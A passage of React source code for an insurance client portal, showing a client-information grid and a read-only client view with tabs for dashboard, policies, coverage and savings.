    ["Home Owner", info.homeOwner],
    ["Car Owner", info.carOwner],
    ["Kids", info.kids],
  ];

  return (
    <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
      <h3 style={{ margin: "0 0 20px", fontSize: 15 }}>Client Information</h3>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 16 }}>
        {fields.map(([label, val]) => (
          <div key={label} style={{ padding: "12px 16px", background: "rgba(255,255,255,0.04)", borderRadius: 8 }}>
            <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8, marginBottom: 4 }}>{label}</div>
            <div style={{ fontSize: 14, fontWeight: 600 }}>{val != null ? String(val) : "—"}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ============================================================
// CLIENT VIEW (read-only portal)
// ============================================================
function ClientView({ client, tab, setTab, onLogout }) {
  const tabs = ["dashboard", "policies", "coverage", "savings"];
  return (
    <div style={{ minHeight: "100vh", background: "#0f172a", fontFamily: "'Segoe UI',sans-serif", color: "#f1f5f9" }}>
      <div style={{
        background: "rgba(255,255,255,0.04)", borderBottom: "1px solid rgba(255,255,255,0.1)",
        padding: "0 32px", display: "flex", alignItems: "center", justifyContent: "space-between", height: 56
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span style={{ fontSize: 20 }}>🛡️</span>
          <span style={{ fontWeight: 700, fontSize: 16 }}>My Insurance Portfolio</span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <span style={{ color: "#94a3b8", fontSize: 13 }}>Welcome, {client.name}</span>
          <button onClick={onLogout} style={{
            padding: "6px 14px", borderRadius: 6, border: "1px solid rgba(255,255,255,0.15)",
            background: "transparent", color: "#94a3b8", cursor: "pointer", fontSize: 13
          }}>Log Out</button>
        </div>
      </div>

      <div style={{ padding: "32px" }}>
        <div style={{ display: "flex", gap: 6, marginBottom: 28 }}>
          {tabs.map(t => (
            <button key={t} onClick={() => setTab(t)} style={{
              padding: "8px 18px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
              background: tab === t ? "#2563eb" : "rgba(255,255,255,0.06)",
              color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400, textTransform: "capitalize"
            }}>{t}</button>
          ))}
        </div>

        {tab === "dashboard" && <DashboardTab client={client} />}
        {tab === "policies" && <PoliciesTab client={client} clients={[client]} saveClients={() => {}} updateClient={() => {}} />}
        {tab === "coverage" && <CoverageTab client={client} />}
        {tab === "savings" && <SavingsTab client={client} />}
      </div>
    </div>
  );
}
